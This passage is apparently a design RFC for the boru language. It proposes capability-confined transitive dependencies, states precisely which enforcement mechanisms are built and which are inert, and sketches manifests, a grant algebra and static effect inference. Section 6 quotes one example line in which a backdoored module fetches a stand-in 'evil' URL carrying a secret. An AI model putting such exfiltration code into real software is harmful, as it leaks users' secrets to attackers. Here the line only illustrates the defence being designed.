# MODULE-SECURITY.0 — Capability-Confined Transitive Dependencies

**Status: design proposal — RFC, not implemented.** This note extends the
*host-imposed* permission model of [PERMISSIONS.10](PERMISSIONS.10.md)
(implemented) into a *per-dependency, module-declared, transitively-attenuated*
capability model. Where PERMISSIONS.10 answers "how does a host sandbox one
boru program?", this note answers "how does a program safely depend on code it
did not write, and code *that* code did not write, all the way down?" — boru's
response to the software-supply-chain trust crisis.

It is written in direct conversation with Laurence Tratt's essay [*Can We
Retain the Benefits of Transitive Dependencies Without Undermining
Security?*](https://tratt.net/laurie/blog/2024/can_we_retain_the_benefits_of_transitive_dependencies_without_undermining_security.html)
(2025-01-28). The short version of the argument below is that boru, by virtue of
being a *concatenative interpreter with object-capability enforcement and no
ambient authority*, is already most of the way to the system Tratt says our
industry needs — but only for the portion of the dependency graph written *in
boru*, and only once four already-scaffolded mechanisms are finished and wired
together.

---

## 0. TL;DR

- **Tratt's problem.** In the real world trust decays exponentially with
  distance; in software it is extended *unchanged* to every transitive
  dependency. His site pulls in 20 direct libraries and builds 181. Any one of
  the 161 indirect ones can, within the shared process, "scan my process's
  memory for passwords, and send any it finds over the internet." The process
  is our only real security boundary, and *within* a process there is
  effectively none.

- **Why boru is different.** boru code is not machine code in a shared address
  space. A boru word cannot read arbitrary memory or make a syscall; the *only*
  path to any effect is dispatching a word that reaches a **wrapped capability
  slot** on the registry (`lang/go/native/capabilities.go`). There is no
  ambient authority to strip away — it was never granted. Tratt's core premise
  ("every machine code instruction can read from, and write to, anywhere") is
  *false for the boru-written part of the graph*.

- **Why the cost objection evaporates.** Tratt notes that his "mutually
  distrusting cells that communicate cheaply" model founders on performance:
  IPC is 5–7 orders of magnitude slower than an in-process call. boru's
  cell boundary is **a hashtable lookup** (`policyGateWord`,
  `permissionedFileOps`), not a process boundary, and cells communicate by
  passing values on the stack. The expensive part of his design is free here,
  because the interpreter is the single shared trusted runtime and the
  "components" are interpreted data + words, not native code.

- **The four questions this note answers.**
  1. *Do modules declare the capabilities they need?* → **Yes** — a proposed
     `capabilities` block in the module's `boru.jsonic` manifest, read at load
     time, defaulting undeclared capabilities to **deny** (§4).
  2. *Can importers restrict deps even more?* → **Yes** — the effective grant
     to a dependency is `Compose(importer-effective, min(declared, per-dep
     override))`; an importer always hands *less than or equal to* what a
     module asks for (§5).
  3. *Transitivity?* → **Yes, and this is the headline** — `Compose` is
     AND-of-both and composes at every edge, so authority is monotonically
     non-increasing down the chain: `cap(child) ⊆ cap(parent) ⊆ … ⊆ cap(root)`.
     Trust decays along the chain, restoring the exponential decay Tratt says
     software lost (§6).
  4. *Well-known subsets / "a sorting library needs no capabilities"?* → **Yes**
     — a **`pure`** subset (`{}`), plus `deterministic`, `read-only`, `client`,
     … Because all host access funnels through ~9 accessors and boru has a static
     checker, a module's *declared* footprint can be *statically verified*
     against its *actual* reachable footprint (§7; feasibility worked through in
     detail in §7.3–7.8, where the dynamic-dispatch surface reduces to a closed,
     gate-able list) — the reliable, re-runnable
     whitelisting Tratt calls "incredibly difficult to do."

- **boru-specific axis.** Resource bounds (step budget, wall-clock, **tape
  growth ceiling**, sub-engine depth, output bytes) are a *second, orthogonal*
  capability axis — quantitative, not allow/deny — that also attenuates
  transitively via the same min-fold. A pure sorting lib gets `{}` *and* a
  bounded tape/step budget: it can neither exfiltrate nor hang nor OOM the host
  (§8).

- **The honest boundary.** All of the above holds for boru-**source** modules.
  A **native/Go** module (`boru:*`, host plugins) is arbitrary machine code and
  is part of the trusted computing base; policy can gate whether it is
  *imported* but cannot sandbox its Go once loaded (§9). boru is "sealed at
  compile time" — no runtime `.so` loading — which makes that native tier
  small, fixed, and auditable, concentrating supply-chain risk exactly where
  Tratt says trust should be scarce.

- **State of the substrate.** The enforcement machinery is ~70% built and
  ~30% scaffolded. `Compose`, the capability wrappers, `install:false`
  structural denial, the import gate, and 7 built-in profiles are **live**. The
  per-export gate, the `Limits` enforcement, per-edge attenuation, the manifest,
  and static effect inference are **declared-but-inert or unbuilt** — §3 and §10
  are precise about which is which.

---

## 1. The problem, per Tratt

The essay's spine, faithfully:

1. **Trust is not transitive, but our tools treat it as if it were.** "If a
   good friend introduces me to one of their friends and says that they trust
   them 100%, I will immediately upgrade my level of trust in that person — but
   not to 100%." In software, by contrast, "a flaw — deliberate or otherwise —
   in a dependency of a dependency of a dependency … is implicitly a flaw in my
   software, because I have to extend identical levels of trust to each part of
   the dependency chain equally." 20 direct → 181 built.

2. **The process is the only boundary, and it stops at the process edge.**
   Processes give "reliable, easily reasoned about, and impermeable boundaries."
   But "within a process there is virtually no security … every machine code
   instruction executed has the ability to read from, and write to, anywhere
   within a process's memory." So any of the 181 dependencies "could decide that
   it will scan my process's memory for passwords, and send any it finds over
   the internet to a bad person."

3. **The obvious mitigations don't work.** Banning `unsafe` is impractical (the
   std library is built on it; "I can never find the right balance between too
   little and too much trust"). Manual whitelisting is "incredibly difficult to
   do reliably, and what happens when a new version of a dependency is released
   — do I have to examine it again from scratch?" Control-flow integrity helps
   memory-safety exploits but "wouldn't mitigate the simple password stealing
   attack." Capability hardware (CHERI) is powerful but its compartments demand
   "very careful *temporal* reasoning" that humans get wrong — "a single mistake
   … can accidentally gift a capability with unexpectedly high privileges"; he
   concludes such compartments are best for keeping *cooperative* code from
   going wrong by accident, and that "ensuring that actively malicious code
   doesn't undermine the … guarantees is much harder."

4. **It will get worse.** leftpad, xz, "install every Python library," the
   hypocrite-commits into Linux, an AI-cloned Rust crate becoming a dependency
   of 134 others, Reflections on Trusting Trust. "Our dependency-heavy approach
   to building software is fundamentally incompatible with security" — said
   reluctantly, because the productivity is real and worth keeping.

5. **His aspiration.** Software built from components that are (a) "isolated
   from each other as much as possible" and (b) each holding "the minimum
   permissions it needs" — "I don't want my image decoding component to have
   network access, or the ability to access RAM with passwords in." Components
   are "mutually distrusting dynamic 'cells', like processes, but with the
   ability to communicate more easily, frequently, and cheaply," with tightly
   specified communication. Antecedents: OpenSSH-style privilege separation and
   the actor model. Two hard challenges: **performance** (IPC 5–7 orders too
   slow; shared memory too dangerous for untrusted code) and **expressivity**
   (keep library ergonomics without "the horrors that RPC tends to descend to").
   Solving the first needs rethought hardware/OS; the second, rethought
   *programming languages*.

This note takes up his last sentence — the language rethink — for one language.

---

## 2. Why boru is structurally different (the thesis)

boru is a **concatenative, interpreted, object-capability** language. Three
properties, each of which directly negates one of Tratt's objections:

### 2.1 No ambient authority → the memory-scan attack is impossible for boru code

A dependency in Rust/Python/JS is native (or compiled-to-native) code sharing
one address space; nothing structurally prevents it from reading the bytes
where your password sits. A boru module is a sequence of **words** interpreted
against a **tape** and a **registry**. boru has no pointer arithmetic, no `unsafe`,
no FFI reachable from source, and — critically — **no way to name a host
capability except by dispatching a word that the interpreter routes to a
wrapped slot**. The capability substrate is explicit about this
(`lang/go/native/capabilities.go` header): the capability implementations live
on `Registry.Capabilities` under string keys and "borueng itself never sees
them"; every host touch goes through one of ~9 typed accessors
(`HostFileOps` / `EffectiveFileOps`, `HostFormats`, `HostExtensions`,
`HostSQLite`, `EffectiveClock`, `HostLogSinks`, `EffectiveDebugOps`,
`HostPolicy`). A module that reaches none of these — and imports no
capability-bearing module — *has no way to affect the world*. There is no
ambient authority to confine; it was never granted.

Tratt's premise "every instruction can read/write anywhere" is a statement
about the von Neumann machine under a native language. It is simply not true of
boru source. That is the whole game.

### 2.2 The cell boundary is a hashtable lookup, not a process

Tratt's model dies on cost: IPC is 5–7 orders of magnitude slower than an
intra-process call, and "Unix-esque shared memory … is far too difficult to use
reliably for untrusted components." boru pays neither price. The "component
boundary" is:

- **for a kernel word:** `e.policyGateWord(name)` → `CheckWord(name)` — one
  glob-matched map lookup at dispatch (`eng/go/engine.go`, `policy_hook.go`);
- **for an effect:** the permissioned wrapper method
  (`permissionedFileOps.WriteFile` → `policy.Check("fileops","write",{path,bytes})`
  → the inner op) — one policy evaluation per syscall-equivalent;
- **for a whole restricted "cell":** a sub-engine with its own registry and an
  attenuated policy (`boru:vm`), reached by `runInSubEngine` — a Go function
  call, not a `fork`.

Components communicate by leaving **values on the stack** and calling words —
the same mechanism as any other call. There is no serialization, no RPC, no
marshalling tax on the hot path. Tratt's expensive prerequisite is boru's
default execution model. His expressivity worry ("the horrors that RPC tends to
descend to") likewise dissolves: a dependency's exports are ordinary words with
ordinary signatures.

### 2.3 Declarative, immutable-for-lifetime policy → no temporal-reasoning footgun

Tratt's deepest worry about capability *machines* is temporal: privileges
change as a program moves through states, and "a single mistake … can
accidentally gift a capability with unexpectedly high privileges." boru's policy
is **data, resolved once, immutable for the lifetime of the engine**
(PERMISSIONS.10 deliberately omits any runtime grant/revoke API — the same
lesson Deno reached when it deprecated `Deno.permissions.request`). Capabilities
are **not first-class values** a boru program can hold, pass, or forge (unlike a
CHERI capability pointer): the only "capability" a word can touch is the wrapped
slot the host installed, and it cannot be widened from inside. There is no
`doPrivileged`, no stack inspection, no ambient reference to leak. The confused-
deputy surface that sank Java's SecurityManager is absent by construction.

### 2.4 The mapping onto Tratt's aspiration

| Tratt wants | boru mechanism |
|---|---|
| Components isolated "as much as possible" | Isolated sub-registries per module / per sub-engine; lexical def-namespace isolation (`RunModuleBody`) + capability-slot isolation (this note) |
| "Minimum permissions it needs" | Capability scopes + global hard-caps + `install:false` structural denial |
| Cells that "communicate … cheaply" | Values on the stack; word dispatch; no IPC |
| "Tightly specified" communication | Typed signatures on exports; the checker (`boru check`) |
| Privilege separation (OpenSSH) | `boru:vm` sub-engines with attenuated policy |
| Least privilege enforced, not hoped | Object-capability wrapping; no ambient authority |

**The catch, stated up front (expanded in §9):** every row above holds for
boru-*source* modules. The interpreter itself, and every *native* (`boru:*`,
Go-implemented) module, is arbitrary machine code to which Tratt's original
argument applies in full. boru does not abolish the trusted computing base; it
makes it **small, fixed at build time, and legible**, and confines everything
above it.

---

## 3. The substrate that exists today

This section is deliberately precise about built vs. inert, because the design
in §4–§8 leans on it and because [PERMISSIONS.10](PERMISSIONS.10.md) has drifted
from the code in three material ways.

### 3.1 The policy model (`lang/go/policy`, implemented)

- **`Policy` interface** (`policy.go`) — seven methods (the design doc lists
  four): `Check(scope,op,args)`, `CheckGlobal(name)`, `CheckWord(name)`,
  `Installed(scope)`, `Scope(name)`, `Limits()`, `Name()`. The concrete
  implementation is the immutable `*Compiled`. A one-method
  `WordChecker{CheckWord}` is exported so the `eng` kernel can gate words
  without importing the whole policy package.
- **Profile shape** (`profile.go`): `Profile{Version, Name, Extends, Limits,
  Scopes map[string]*Scope}`; `Scope{Install *bool, Words WordsBlock, Scopes}`;
  `WordsBlock{Default Effect, Rules []Rule}`; `Rule{Allow, Deny, Where}`.
  `Effect ∈ {"allow","deny"}`, empty default = allow. Rule order is
  **last-match-wins**.
- **`KnownScopes`** (11): `global, engine, modules, fileops, network, sqlite,
  formats, env, process, clock, log`. (The doc omits `log`.)
- **`GlobalOps`** — 8 coarse hard-caps: `disk.read, disk.write, network,
  process, env, clock, system-info, mutate`. `GlobalsFor(scope,op)` binds
  capability ops to these (e.g. `fileops.write → disk.write`). A capability
  rule can never grant what a global denies (the SCP / `pledge` bounding-set
  pattern).
- **Built-in profiles** (7, not 6): `full, trusted, sandbox, compute, gen,
  read-only, client` (`builtin.go`). `compute` — not "no I/O at all" as the doc
  says, but pure math + clock + `mutate` + in-memory formats + `boru:math`, with
  `fileops/network/sqlite/process/env` all `install:false`. There is **no
  `pure` profile**; `compute` is the pure tier. `gen` (used by property-based
  testing) is absent from the doc entirely.

### 3.2 Enforcement points (what is actually wired)

| Gate | Where | Status |
|---|---|---|
| Kernel word dispatch | `engine.go::policyGateWord` → `CheckWord` = `Check("engine",name,nil)` | **live** (name-only, no args) |
| Module *import* | `modules.go::Resolve` → `Installed("modules")` + `Check("modules","import",{module})` + per-module `install` | **live** (keyed on module ID) |
| File read/write/mkdir | `permissioned_fileops.go` → `Check("fileops",…,{path,bytes})` | **live** |
| Network fetch | `fetch.go::checkFetchPolicy` → `Check("network","connect",{url,host,port})` | **live** |
| Log emit / sink install | `log_module.go::logAllowed` → `Check("log",…)` | **live** |
| `install:false` structural denial | `SetHostFileOps`/`Formats`/`SQLite`/`LogSinks` delete the slot; accessor returns a not-installed stub | **live** |
| Module *export* call | policy evaluator `checkModuleCall` (`Check("modules","call",{module,export})`) | **LIVE (NUR045, 2026-08-02).** The export's policy identity is stamped onto its dispatchable signatures at module-resolution time (`eng.StampModuleCallGates`); every dispatch chokepoint on both engines gates on that stamp, so per-export deny rules (e.g. `boru:time-util deny sleep`) are enforced — including through a parked fn value. Profiles with no per-export rules pay one precomputed boolean. |
| SQLite / env / process / clock per-op | `GlobalsFor` binds them, but no production `Check("sqlite"/"env"/"process"/"clock",…)` | **inert** (only `Installed(sqlite)` on/off is enforced) |
| `mutate` / `system-info` hard-caps | in the enum; no `GlobalsFor` binding; no production `CheckGlobal` callers | **inert** |

### 3.3 Attenuation: `Compose`, not `RequireSubset` (CRITICAL correction)

PERMISSIONS.10 presents `RequireSubset(child, parent)` as *the* attenuation
mechanism. **That function is now marked `DEPRECATED — UNSOUND` in its own
doc-comment** (`subset.go`): it compares only scope defaults and `install`
flags, so a parent `default:allow` + specific `deny` is not enforced on the
child. It has no production callers.

The real, sound primitive is **`Compose(parent, child) Policy`**
(`compose.go`): it returns an AND-of-both wrapper where `Check` / `CheckGlobal`
/ `CheckWord` require **both** layers to allow (parent votes first,
short-circuits), `Installed()` is `parent ∧ child`, and `Limits()` is the
**min-non-zero of each field**. `boru:vm`'s `runInSubEngine` composes
`Compose(parentPol, childPol)` for exactly this reason: a child rule can never
lift a parent deny, *regardless of the child's rule shape*. This is the primitive
the rest of this note builds on.

### 3.4 Isolation and marshalling (two more corrections)

- **Imported boru modules do NOT start blank.** `RunModuleBody`
  (`native_module_module.go`) runs a file module in a fresh sub-registry but
  **inherits the parent's host capabilities into it**:
  `SetHostFileOps(modReg, HostFileOps(parent))` (already the policy-wrapped
  `permissionedFileOps`), plus formats, extensions, streams, and
  `Modules.InheritConfig` (so the child can itself `import "boru:…"`). Isolation
  today is **lexical** (the def namespace; only `export`ed names cross), **not
  capability**. Worse, `CapPolicy` is *not* propagated, so any capability that
  re-checks at call time via `HostPolicy(childReg)` sees `nil` = allow-all
  inside the child. **Per-dependency capability attenuation for boru modules is
  therefore genuinely unbuilt** — capabilities flow *down* the import graph
  unattenuated. This is the central gap §5–§6 close.
- **The import boundary is by-reference, not by-copy.** Exports cross as shared
  `*OrderedMap` pointers; an exported `FnDefInfo` carries `Registry: modReg`;
  pointer-backed payloads (`Map`/`Store`/`Array`) share underlying state across
  the boundary. There is no serialization. Consequence for this design: we
  **cannot** rely on a copy boundary to attenuate — we must hand a module
  *already-attenuated* capability wrappers, because anything it receives by
  reference it can invoke or mutate directly.

### 3.5 The capability accessor choke-point → pure modules already exist

Because *all* host access funnels through the ~9 accessors, purity is a
mechanically-checkable property. Grepping both the module builder and the
underlying native implementation, these modules touch **no** accessor and import
no `os`/`net`/`time`/`math-rand`:

> `boru:math-util`, `boru:array-util` (**including `sort`**), `boru:string-util`,
> `boru:type-util`, `boru:struct-util`, `boru:logic-util`, `boru:bin-util`,
> `boru:matrix-util`, and `boru:report`.

These are exactly the `-util` convention modules plus `report`. This is the
concrete evidence behind "a pure sorting library needs no capabilities" (§7):
`boru:array-util`'s `sort` is *already* capability-free and could be *proven* so.

The capability-bearing modules are the complement: `boru:io` (fileops + formats +
sqlite + output), `boru:net` (network), `boru:time-util` (clock + real timers),
`boru:rand` (one clock read at import for the default seed), `boru:query` (sqlite),
`boru:log`, `boru:debug`, `boru:model` (fileops), `boru:parselang` (formats),
`boru:vm`, `boru:test` (clock).

### 3.6 Resource governors (enforced) vs. `Limits` (declared-only)

**Enforced** — hard-coded kernel constants, process-global, no policy input:

| Governor | Value | Where / error |
|---|---|---|
| Interpreter step limit | `DefaultStepLimit = 10_000_000`, host-overridable via `Options.Steps` | `engine.go` Run loop → `evaluation_limit` |
| Paren-group step cap | per-group, = the engine's step limit | `evalParenGroupAt` → `evaluation_limit` — **does not compose, see below** |
| **Tape growth ceiling** | ≈ `1024·2.7⁶` ≈ **397k entries ≈ 64 MB** | `tape.go` gap-buffer; `Exhausted()` → `tape_exhausted` |
| VM operand-stack + frame depth | `vmStackCeiling` (= tape ceiling) | `vm.go` → `tape_exhausted` |
| Parser nesting depth | `maxParseNestingDepth = 10000` | `parser/parse.go` → `evaluation_limit` |
| Check-mode step budget | `DefaultCheckStepBudget = 500_000` | `engine.go` check loop → `step_budget_exceeded` |

> **FOLLOW-UP (2026-07-30) — the step budget is per-group, not aggregate, so
> `Options.Steps` does not bound a program.** Raised in review of PR #319,
> confirmed twice by independent verification against the code and by running
> the built CLI.
>
> `evalParenGroupAt` drives its own loop with a FRESH counter that runs to the
> full `e.stepLimit`, while the outer `Run` loop charges the entire group as a
> SINGLE step. A program made of many — or nested — parenthesised forward
> arguments therefore executes without effective limit, and `evaluation_limit`
> never fires. The two counters do not share a budget, so the governor above
> bounds one group at a time rather than the program.
>
> This matters most to exactly the reader this note is written for: a host
> setting a low `Options.Steps` to bound code it did not write. The table above
> presents that governor as "enforced"; for paren-heavy input it is not.
>
> **Shape of the fix:** one budget CONSUMED by every evaluator — thread a
> shared remaining-steps counter (on the engine, decremented by the outer loop,
> by `evalParenGroupAt`, and by nested sub-evaluations) rather than handing each
> its own ceiling. The VM path needs the same treatment; `stepLimitFor` is
> already the single resolution boundary, so the plumbing exists. The
> acceptance test is a program with deeply nested parens under a small
> `--options steps:N` that MUST raise `evaluation_limit`, plus its negative
> twin — a program that legitimately fits the budget and must not.
>
> Recorded rather than fixed in that PR because it is engine work with its own
> ratchets (`pinnedCheckRunDivergent`, the spec corpus), not part of the CLI
> arc that surfaced it.

The **tape growth ceiling** is the "tape length limitation" the brief names: the
engine runs on a bounded-growth gap buffer (see
[TAPE-DATA-STRUCTURE.10](legacy/TAPE-DATA-STRUCTURE.10.ignore)); a program that splices
without bound latches `exhausted` rather than OOMing the host.

**Declared-only** — `policy.Limits` (`policy.go`) has six fields: `TimeoutMs`,
`MaxStepBudget`, `MaxStackDepth`, `MaxMemoryBytes`, `MaxOutputBytes`, and
`MaxSubEngineDepth` (default 8). They are **resolved, composed (min-fold), and
displayed — but no engine, registry, or module code reads any of them to bound
execution.** Even `MaxSubEngineDepth` is never checked, so `boru:vm` nesting is
unbounded today. The *algebra* for treating limits as attenuating quantitative
capabilities (`Compose(...).Limits()` min-fold) is built and tested; the
*consumer* is missing. §8 closes this.

---

## 4. Do modules declare the capabilities they need?

**Proposal: yes — a `capabilities` block in the module manifest, defaulting
undeclared capabilities to deny.**

### 4.1 Where it attaches

A published boru module is a `.boru` payload plus an **`boru.jsonic`** manifest
(fields today: `name`, `major`/`minor`/`patch`, `files`, `deps`, per-module
`main` + `resource`), resolved by `boru prep` into **`.boru/boru.json`**, which is
already read *at module-load time* by `resolveModuleMain` and
`loadModuleResources`. That resolved manifest is the natural home for a
capability declaration — it is on the load path already, and the registry's
`handlePublish` is the natural place to record and (eventually) sign it.

### 4.2 Shape

The declaration draws from the existing `KnownScopes` / `GlobalOps` vocabulary
so a module's *ask* and a host's *grant* speak one language:

```jsonic
// boru.jsonic for a CSV-loading module
name: "acme-csv"
major: 1  minor: 2  patch: 0
capabilities: {
  requires: {
    fileops: { read: true }                 // reads files
    formats: { decode: ["csv", "tsv"] }      // decodes these formats
  }
  // everything not listed is implicitly denied
}
```

```jsonic
// boru.jsonic for a sorting library
name: "acme-sort"
capabilities: { requires: {} }               // pure — the empty ask
// equivalently: capabilities: { subset: "pure" }   (see §7)
```

Design decisions:

- **The declaration is a *ceiling the module requests*, not a grant.** The
  effective grant is computed by the importer (§5); a manifest never grants
  itself anything.
- **Undeclared ⇒ deny.** This inverts today's `RunModuleBody` inherit-all. A
  module that forgets to declare `network` cannot reach it — fail-closed,
  matching PERMISSIONS.10's "permissions are opt-in" only in reverse: for
  *dependencies*, capabilities are opt-out-of-nothing, opt-in-by-declaration.
- **Granularity mirrors the policy scope shape** (`scope → op → where`), so a
  module can declare `fileops.read where path in ["./fixtures/**"]` and an
  importer's grant is a further `Compose` on top.
- **Sentinel discipline** (per eng/go/CLAUDE.md "No Zero-Value Overload"):
  resolve "absent = deny" at the single manifest-load boundary so the Go zero
  never reaches a consumer, exactly as `NewRegistry` resolves `-1` sentinels.

### 4.3 Who writes it — and why that is the crux

Tratt's strongest practical objection to whitelisting is authorship:
"incredibly difficult to do reliably, and what happens when a new version …
do I have to examine it again from scratch?" boru has an answer the native
ecosystems don't: **`boru check` can *infer* the manifest** and offer to write
it. Because the capability scopes are an *effect alphabet* and the carrier
checker already walks the call graph
([effect-oriented-programming-in-boru-report.0](legacy/effect-oriented-programming-in-boru-report.0.ignore)
idea #1), a module's required-capability set is the union of the effect sets of
the words it can reach — a fixpoint the checker already computes for types. So:

1. author writes the module;
2. `boru check --emit-capabilities` infers `{fileops:{read}, formats:{decode:[…]}}`
   and writes it into `boru.jsonic`;
3. the author confirms (or tightens) it;
4. on every new version, step 2 re-runs automatically — the manifest either
   still holds, or the *diff* shows a widened ask (a `network` that wasn't there
   before), which is a reviewable, machine-generated red flag.

This converts Tratt's "examine from scratch on every release" into "review a
one-line capability diff," and it is the same mechanism that makes the
declaration *verifiable* rather than merely *claimed* (§7).

---

## 5. Can importers restrict deps even more?

**Yes — the effective grant to a dependency is the composition of what the
importer holds, what the module asks for, and what the importer chooses to hand
down.** The importer is always the senior party.

### 5.1 The grant algebra

For an import edge *parent → dep*:

```
declared   = dep.boru.jsonic.capabilities.requires        // the ask (§4)
override   = parent's per-dep grant for this edge          // optional, ≤ declared
offered    = min(declared, override)                       // importer may hand LESS
effective  = Compose(parent_effective_policy, offered)     // AND-of-both (§3.3)
```

`Compose` guarantees `effective ⊆ parent_effective`: the dep can never exceed
its importer, and the importer can independently narrow below the ask — a
sorting lib that *declared* `clock` (say, for benchmarking) is handed `{}` by an
importer that doesn't want it timing anything. The importer never has to grant
the full ask; the ask is an upper bound on the *conversation*, not a demand.

### 5.2 Per-import-edge policy (the new mechanism)

Today, policy is registry-global plus a per-module-ID *import* gate. To let an
importer give *different* deps *different* authority, `import` must install each
dependency behind a capability boundary parameterized by that edge's `effective`
policy. Concretely, fixing the §3.4 gap:

- `RunModuleBody` (and the native-module install path) stops inheriting the
  parent's slots wholesale. Instead it installs, into the child sub-registry,
  **attenuated wrappers** built from `effective` — e.g. a `permissionedFileOps`
  whose policy is `effective`, or a deleted slot when `effective` denies the
  scope's `install`.
- `CapPolicy` **is** propagated to the child (currently it is not), so any
  call-time re-check inside the child sees `effective`, not `nil`/allow-all.
- Because marshalling is by-reference (§3.4), the wrappers handed down are
  *already* attenuated — the child cannot reach a rawer capability because it
  never receives one.

A surface sketch (final syntax open, §12):

```boru
import "acme-csv"                                   // grant = declared ∩ parent
import "acme-csv" with { fileops: { read: {
          where: { path: ["./data/**"] } } } }      // grant strictly less
import "acme-sort" as-pure                           // grant = {}  (override to pure)
```

or, declaratively, a per-dependency grant block in the importer's own
`boru.jsonic` alongside `deps`, so the whole tree's edge-grants are one
reviewable artifact (the natural companion to a lockfile, §9.3).

### 5.3 Relationship to `boru:vm`

`boru:vm`'s `Vm.run-with code policy` already runs code under
`Compose(parent, child)` in an isolated sub-engine. Per-edge import attenuation
is, in effect, **`vm.run-with` applied at each `import`** with the edge's
`effective` policy and the module body as the code — the same primitive, moved
from an explicit word to the dependency boundary. This is a strong signal the
mechanism is right: it is not a new enforcement path, it is the existing one
relocated to where dependencies enter.

---

## 6. Transitivity — restoring the exponential decay of trust

This is the headline result and the direct answer to Tratt.

Because `Compose` is AND-of-both and is applied at **every** edge, effective
authority is **monotonically non-increasing along any dependency chain**:

```
cap(great-grandchild) ⊆ cap(grandchild) ⊆ cap(child) ⊆ cap(root)
```

A level-5 indirect dependency can do no more than its level-4 parent chose to
pass down, which is no more than *its* parent passed, all the way to the root
program that the developer actually controls. **Trust decays along the chain
instead of extending unchanged** — precisely the property Tratt says software
lost and physical-world trust retains.

Worked example (Tratt's own image-decoder scenario, in boru terms):

```
root program            grant: { fileops:{read,write}, network:{connect: allowlist} }
└─ import "acme-report"  grant: Compose(root, report.declared)
   ├─ import "acme-csv"  grant: { fileops:{read} }        // report hands down read-only
   │  └─ import "acme-sort"  grant: {}                     // csv hands down pure
   └─ import "acme-http"  grant: { network:{connect: allowlist ∩ report's} }
```

`acme-sort`, five words from the developer's intent, is **structurally
incapable of touching the network** even if a future release is backdoored: it
was handed `{}`, it runs in a child registry whose network slot is uninstalled,
and there is no ambient authority to fall back on. A compromised `acme-sort`
that inserts `Net.fetch "https://evil/?p=" concat (read-secret)` fails at
`import "boru:net"` (the `modules` import gate denies it) — and even if it were
already imported, at `checkFetchPolicy` (network `install:false`). The
memory-scan attack from §1 has no analogue at all: there is no memory to scan.

### 6.1 What must ship to make this real

Transitivity is *sound in the algebra today* (Compose composes at each `boru:vm`
layer) but *not yet enforced at import edges*. Three concrete items, all
scaffolded:

1. **Per-edge attenuated install** (§5.2): `RunModuleBody` installs `effective`
   wrappers instead of inheriting parent slots; propagate `CapPolicy` to the
   child. *(fixes the §3.4 inherit-all gap)*
2. ~~**Wire the per-export gate**~~ — **DONE (NUR045, 2026-08-02).** The
   production call site exists at module-export dispatch on both engines, so per-export
   denies (e.g. `deny sleep`) actually bite. *(fixes the §3.2 stub)*
3. **Bound the depth**: enforce `MaxSubEngineDepth` with a counter in
   `runInSubEngine` / the import path, so a maliciously deep transitive chain
   (or `boru:vm` recursion) cannot exhaust the Go stack. *(fixes the §3.6
   inert-limit gap)*

---

## 7. Well-known capability subsets

**Yes — named, reusable capability subsets a module declares and an importer
recognizes at a glance, anchored by a `pure` tier and made trustworthy by
static verification.**

### 7.1 The subset vocabulary

The 7 built-in profiles (§3.1) are the existing named bundles, but they are
*host-global* today. This note reframes them as *per-module subsets* a
dependency can request and an importer can grant wholesale:

| Subset | Capabilities | Example modules |
|---|---|---|
| **`pure`** | `{}` — nothing | `boru:array-util` (`sort`), `boru:math-util`, `boru:string-util`, all `-util`, `boru:report` |
| **`deterministic`** | pure + no clock + no rand seed → reproducible | pure algorithms that must not observe wall-time |
| **`read-only`** | `fileops.read` + `formats.decode` | config loaders, parsers over local files |
| **`compute`** | pure + in-memory formats + `mutate` + clock | number-crunching with scratch state |
| **`client`** | `read-only` + `network.connect` to an allowlist | API SDKs |

A module declares `capabilities: { subset: "pure" }` as sugar for
`requires: {}`; an importer can adopt a *default subset for all transitive
deps* ("everything is `pure` unless I explicitly widen it"), which is the
capability-least-privilege default Tratt asks for, expressed once.

### 7.2 "A sorting library needs basically no capabilities" — and can be *proven* so

This is where boru answers Tratt's whitelisting objection head-on. It is not
enough for `acme-sort` to *declare* `pure`; a backdoored release could declare
`pure` and still reach `Net.fetch`. What makes the declaration *load-bearing* is
that boru can **statically verify declared ⊇ actual**:

- **The mechanism.** All host access funnels through ~9 accessors (§3.5), boru
  has no ambient authority, and the carrier checker already computes a call-graph
  fixpoint. Adding an `Effects []string` facet to signatures (drawn from the
  capability vocabulary) and unioning it up the graph — the
  [effect-oriented-programming report](legacy/effect-oriented-programming-in-boru-report.0.ignore)'s
  highest-leverage idea, currently the one "Absent" row in its parallel-evolution
  table — yields each module's *actual* reachable capability set. The compiler
  already tracks a pure/effectful split informally (`CompileIslandPure`); this
  promotes it to a first-class, inferred, checkable property.
- **The check.** `boru check` verifies the manifest's *declared* set is a
  superset of the *inferred actual* set. A module that declares `pure` but
  reaches a `network` word is a **compile-time capability violation**, reported
  at the call site, *before any runtime denial*. Publish-time gating rejects it.
- **The re-runnability.** On a new version the inference re-runs automatically;
  a widened footprint surfaces as a manifest diff (§4.3). This is exactly the
  "reliable" and "don't re-examine from scratch" that Tratt says manual
  whitelisting lacks.
- **The purity invariant.** Make the `-util` convention a *checked* invariant: a
  lint/test asserting that every `BuildXxxUtilModule` (and every module
  declaring `pure`) touches none of the ~9 accessors. Today the convention is
  documentation in `lang/go/CLAUDE.md`; nothing stops a future `-util` module
  from calling `HostFileOps`. Machine-check it.

Verification is the difference between a manifest that is a *promise* (Tratt's
distrusted case) and a manifest that is a *proof for the boru-source portion of
the graph*. Native modules can only be *attested*, not verified (§9) — which is
why the trust boundary matters.

### 7.3 Feasibility of capability inference

The verification story in §7.2 rests on a claim — that a module's *actual*
reachable capability footprint is statically computable — that deserves a
sober assessment rather than optimism. It splits into two questions of very
different difficulty:

- **(a) The reachability / purity verdict** — "does this module and its
  transitives reach *any* capability-bearing word, or any dynamic-eval escape
  hatch?" This is **soundly decidable and the load-bearing case** (it backs "a
  sorting library is pure" and lets an importer default-deny all transitives).
- **(b) The precise effect *set*** — "*exactly which* capabilities, with what
  `where`-constraints?" **Feasible, with a soundness/precision trade-off**: some
  modules over-approximate unless annotated.

**Why boru is unusually favorable.** Doing this in Rust/JS is hard because the
escape hatch is *every pointer and every dynamic call*. In boru the surface is
small, named, and finite, and the analyzer substrate already exists:

- **Closed effect alphabet + no ambient authority.** Effects enter *only*
  through the ~9 host accessors (§3.5) and the enumerable set of
  capability-bearing words. "Reaches none of them ⇒ pure" is therefore *sound*,
  not hopeful.
- **The carrier checker already computes this shape of analysis.** It walks the
  call graph with memoised per-`def` summaries (`FnSummaries`, keyed by
  scope + name + arg-shape + body; `FnAnalysisQuota = 64` per fn, with an
  `analysis_truncated` diagnostic on blow-up), already walks literal quotation
  bodies (`RunCarrierBodyWithDefs`), and already carries an *effect facet* on
  signatures — `CompileEffect` with flags like `CompileIslandPure` and
  `CompileFallbackBody` (`eng/go/value.go`, `carrier.go`) that classify a word's
  purity for the compiler. A **capability-effect set** is a *new facet on the
